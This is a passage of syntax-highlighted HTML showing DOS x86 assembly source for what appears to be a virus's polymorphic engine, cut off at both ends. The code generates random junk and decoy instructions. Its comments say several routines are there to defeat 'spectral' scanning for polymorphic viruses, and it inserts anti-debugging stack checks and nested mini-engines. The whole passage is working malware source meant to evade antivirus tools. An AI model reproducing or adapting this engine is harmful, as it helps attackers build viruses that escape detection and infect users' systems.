        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">inst_3</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@add_or_sub_ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@mov_dx_inm</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0bbh</span><span class="sc0">   </span><span class="sc1">; mov bx,reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@mov_dx_inm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0bah</span><span class="sc0">   </span><span class="sc1">; mov dx,reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@add_or_sub_ax</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@mov_mem_ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">    </span><span class="sc1">; add ax,reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@mov_mem_ax</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0a1h</span><span class="sc0">   </span><span class="sc1">; mov ax,mem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


  </span><span class="sc1">; Generator ----&gt; Four bytes instructions</span><span class="sc0">

</span><span class="sc5">inst_4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">inst_4</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@q_seg_parte</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@q_movdxobx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@q_subbxfuck</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">numero_instruccion</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; I don't want to</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@q_subbxfuck</span><span class="sc0">   </span><span class="sc1">; make an Int21h about 7000 times &lt;g&gt;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">11b</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">@IntFunctions</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Get drive function</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">021cdh</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@IntFunctions</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">035b4h</span><span class="sc4">,</span><span class="sc2">052b4h</span><span class="sc4">,</span><span class="sc2">019b4h</span><span class="sc4">,</span><span class="sc2">062b4h</span><span class="sc0">

</span><span class="sc5">@q_subbxfuck</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0eb81h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@q_movdxobx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@q_movdx_mem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">01e8bh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@q_movdx_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0168bh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@q_seg_parte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@q_seg_sub</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0c281h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@nosvamos_4</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@nosvamos_4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@q_seg_sub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0ea81h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@nosvamos_41</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@nosvamos_41</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


 </span><span class="sc1">; Generator ----&gt; More than 4 bytes routines</span><span class="sc0">

</span><span class="sc5">inst_5</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">               </span><span class="sc1">; Anti-spectral routine,</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;generates a random value</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@c_seg_parte</span><span class="sc0">            </span><span class="sc1">;after a cmp ax,ax/jz xxx</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;that will never be executed:</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@c_seg_prim</span><span class="sc0">             </span><span class="sc1">;'spectral' is a way of</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0c033h</span><span class="sc0"> </span><span class="sc1">;finding polymorphic viruses</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0274h</span><span class="sc1">;that checks for instructions</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">               </span><span class="sc1">;that aren't in the poly</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;engine; if the instructions</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                  </span><span class="sc1">;are all of a fixed range,</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;the spectral identifies the</span><span class="sc0">
                                                </span><span class="sc1">;poly engine.</span><span class="sc0">

</span><span class="sc5">@c_seg_prim</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@reentrant_calls</span><span class="sc0">

</span><span class="sc5">Etiketa</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0f7fah</span><span class="sc0">     </span><span class="sc1">; Antidebugging routine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0f7dch</span><span class="sc0">   </span><span class="sc1">;( cli, neg sp, neg sp,</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0fbdch</span><span class="sc0">   </span><span class="sc1">; sti )</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@c_seg_parte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@c_seg_seg</span><span class="sc0">              </span><span class="sc1">; Anti-spectral</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@reentrant_calls</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0ffb8h</span><span class="sc0">     </span><span class="sc1">; mov ax,0ffffh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">040ffh</span><span class="sc0">   </span><span class="sc1">; inc ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0274h</span><span class="sc0">   </span><span class="sc1">; jz  seguimos</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">                   </span><span class="sc1">; ( 2 crap bytes )</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@c_seg_seg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@make_dumb_jmp</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">ant_debug</span><span class="sc0">            </span><span class="sc1">; Antidebugging, the routine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">@End_ant</span><span class="sc4">-</span><span class="sc5">ant_debug</span><span class="sc0">    </span><span class="sc1">;placed near the beggining</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;of Zohra</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@make_dumb_jmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2d</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">garbage_inside</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">garbage_inside</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ant_debug</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Anti-debugging typical old boring</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;routine :-P.</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@End_ant</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">@End_ant</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">reentrant_flag</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">posicion_sub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">@reentrant_calls</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reentrant_flag</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@make_call</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">restantes_poly</span><span class="sc4">],</span><span class="sc2">50d</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">Etiketa</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">20d</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">5d</span><span class="sc0">                   </span><span class="sc1">; At least inside = 5 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                       </span><span class="sc1">; The jump is stored</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">posicion_sub</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">restantes_poly</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Make a mini-poly :P</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Numero_instruccion</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">restantes_poly</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">numero_instruccion</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">centro_poly</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Numero_instruccion</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">restantes_poly</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reentrant_flag</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@make_call</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
